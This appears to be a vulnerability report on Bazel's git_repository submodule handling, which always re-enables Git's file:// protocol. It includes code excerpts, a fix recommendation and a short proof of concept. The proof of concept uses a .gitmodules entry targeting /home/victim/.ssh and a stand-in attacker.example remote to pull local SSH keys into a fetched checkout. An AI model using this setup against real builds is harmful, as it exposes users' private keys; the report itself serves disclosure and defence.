### Title
Forced re-enablement of Git's disabled `file://` submodule protocol allows attacker-controlled repositories to read/clone arbitrary local paths - (File: `tools/build_defs/repo/git_worker.bzl`)

### Summary
`git_repository`/`new_git_repository`'s submodule handling in `tools/build_defs/repo/git_worker.bzl` unconditionally passes `-c protocol.file.allow=always` to `git submodule update --init [--recursive]`. This unconditionally reinstates the `file://` transport for submodule fetches that upstream Git deliberately disabled by default (Git ≥2.38.1, the fix for the submodule "local clone" attack class, tracked upstream as GHSA-oww2-jvp5-9j2q/CVE-2022-39253). Because Bazel forces this back to `always` for every `git_repository` invocation that sets `init_submodules`/`recursive_init_submodules`, a hostile repository (or a hostile branch/tag/commit of an otherwise-trusted repository, or a compromised mirror serving that commit) can ship a `.gitmodules` file whose submodule `url` is `file://<local-path>`, causing Bazel's outer `git` process to treat an attacker-chosen local filesystem path as a submodule source during checkout.

### Finding Description
`tools/build_defs/repo/git_worker.bzl` defines: [1](#0-0) 
which always appends `-c protocol.file.allow=always` before calling `git submodule update --init --checkout --force` (or `--recursive`). The accompanying comment makes the intent explicit: [2](#0-1) 
This directly and unconditionally overrides the upstream Git default of `protocol.file.allow=user` for non-interactively-invoked submodule fetches (Git sets `GIT_PROTOCOL_FROM_USER=0` for submodule recursion, which is what made `file://` submodule URLs require explicit opt-in after the CVE-2022-39253 fix). The `_execute` helper only strips a fixed set of `GIT_*` environment variables and otherwise passes through `ctx.os.environ`, and does not itself add any protocol allow-listing: [3](#0-2) 
`update_submodules` is invoked from `_update`, which runs unconditionally whenever `init_submodules` or `recursive_init_submodules` is set on the rule: [4](#0-3) 
There is no check anywhere in `git.bzl`/`git_worker.bzl` restricting which protocols a submodule URL sourced from the fetched repository's own `.gitmodules` file may use, and no validation that a `file://` submodule target stays inside the intended checkout tree.

### Impact Explanation
`init_submodules`/`recursive_init_submodules` are legitimate, common attributes on `git_repository` (used to pull in vendored/third-party submodules of a dependency). The attacker here is the *content* of the fetched repository — i.e., whoever controls the `remote` URL's server, a compromised branch/tag, or a mirror — not the person invoking Bazel, and not someone with access to the victim's trusted root-repo BUILD/.bzl files. By adding a `.gitmodules` entry with `url = file:///some/local/path` (an absolute path predictable on many CI images, e.g. another checked-out repository, SSH key directories, or shared caches), the attacker forces Bazel's `git` subprocess to perform a local git "clone" of that path during `submodule update`, which git implements via hardlinking objects from the target `.git` directory into the submodule. This is exactly the primitive Git's own file-protocol restriction was added to stop, because a local "clone" of an attacker-chosen path can expose file contents that end up materialized inside the externally-visible repository checkout, and/or plant/execute hooks depending on the target directory's git configuration. This is a read/exposure of content from outside the intended repository/output-base boundary, driven purely by attacker-published repository content, with no attacker access to the victim's machine or credentials required beforehand.

### Likelihood Explanation
Any external dependency fetched via `git_repository`/`new_git_repository` with `init_submodules = True` or `recursive_init_submodules = True` is exposed to this: a single hostile commit, tag, or branch of that dependency (or a compromised mirror serving it) is sufficient — no additional privilege or interaction is required from the victim beyond running the build. Because Bazel silences Git's own protection with a hardcoded `always`, there is no flag or configuration a Bazel user can set to restore Git's default protection short of not using submodule-init at all.

### Recommendation
Do not hardcode `protocol.file.allow=always` for submodule updates. At minimum, scope the override to only cover submodule URLs that are relative/local paths *known to reside within the already-verified checkout* (the legitimate #17040 use case — same-workspace local submodules), and otherwise leave Git's default (`user`/disabled for non-interactive submodule recursion) in effect so that `file://` (and other non-`http(s)`/`git`) submodule URLs sourced from an untrusted `.gitmodules` are rejected unless the top-level rule invocation explicitly opts in (e.g., a new `allow_file_submodules` attribute defaulting to `False`).

### Proof of Concept
1. Prepare an attacker-controlled bare repo `evil.git` with a `.gitmodules` referencing a submodule pointing at an absolute local path known to exist on the target machine, e.g.:
   ```
   [submodule "leak"]
     path = leak
     url = file:///home/victim/.ssh
   ```
   with a matching `160000` gitlink commit entry.
2. In a `MODULE.bazel`/`WORKSPACE`, declare:
   ```python
   git_repository(
       name = "dep",
       remote = "https://attacker.example/evil.git",
       commit = "<pinned-evil-commit>",
       recursive_init_submodules = True,
   )
   ```
3. Run `bazel fetch @dep` (or any build depending on `@dep`). Trace shows `tools/build_defs/repo/git_worker.bzl`'s `update_submodules` invoking `git -c protocol.file.allow=always submodule update --init --recursive --checkout --force`, which will locally "clone" `/home/victim/.ssh` into the `leak/` submodule directory inside the Bazel-managed external repo, materializing its contents where the build (and any rule reading files from `@dep`) can access them — despite the `commit` pin providing no protection against this submodule-side redirection since Git's own file-protocol containment has been disabled by Bazel.

A reproducible `src/test/shell/bazel/starlark_git_repository_test.sh`-style test can assert that `git -c protocol.file.allow=always` is *not* passed unconditionally, and that a crafted `.gitmodules` with a `file://` URL pointing outside the temp checkout root fails the submodule update by default.

```text
def _update(ctx, git_repo):
    ctx.delete(git_repo.directory)

    init(ctx, git_repo)
    add_origin(ctx, git_repo, ctx.attr.remote)
    fetch(ctx, git_repo)
    reset(ctx, git_repo)
    clean(ctx, git_repo)

    if git_repo.recursive_init_submodules:
        ctx.report_progress("Updating submodules recursively")
        update_submodules(ctx, git_repo, recursive = True)
    elif git_repo.init_submodules:
        ctx.report_progress("Updating submodules")
        update_submodules(ctx, git_repo)
```

```text
def update_submodules(ctx, git_repo, recursive = False):
    if recursive:
        # "protocol.file.allow=always" allows the submodule command clone from a local directory.
        # It's necessary for Git 2.38.1 and assoicated backport versions.
        # See https://github.com/bazelbuild/bazel/issues/17040
        _git_maybe_shallow(ctx, git_repo, "-c", "protocol.file.allow=always", "submodule", "update", "--init", "--recursive", "--checkout", "--force")
    else:
        _git_maybe_shallow(ctx, git_repo, "-c", "protocol.file.allow=always", "submodule", "update", "--init", "--checkout", "--force")
```
